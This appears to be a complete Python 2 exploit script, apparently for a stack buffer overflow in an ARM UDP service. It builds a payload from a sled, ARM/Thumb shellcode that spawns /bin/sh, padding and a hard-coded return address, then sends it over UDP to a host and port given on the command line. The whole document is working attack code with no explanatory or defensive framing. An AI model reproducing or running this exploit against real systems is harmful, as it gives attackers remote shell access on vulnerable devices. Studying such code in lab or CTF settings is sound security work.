#!/usr/bin/python

import sys, socket

shellcode = ("\x01\x10\xa0\xe1"*17
+"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x2d\x1c\x2f\x62\x69\x6e\x2f\x73\x68\x58"
+"AAAA"+"\x7c\xe4\xff\x7e")



if __name__ == '__main__':
    if(len(sys.argv)) != 3:
        print "./so.py localhost 5555"
        sys.exit() 
    
    sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM,0)
    sock.connect(( sys.argv[1], int(sys.argv[2]) ))
    sock.send(shellcode)
    sock.close()

    print "Shellcode Length: %d" %len(shellcode)
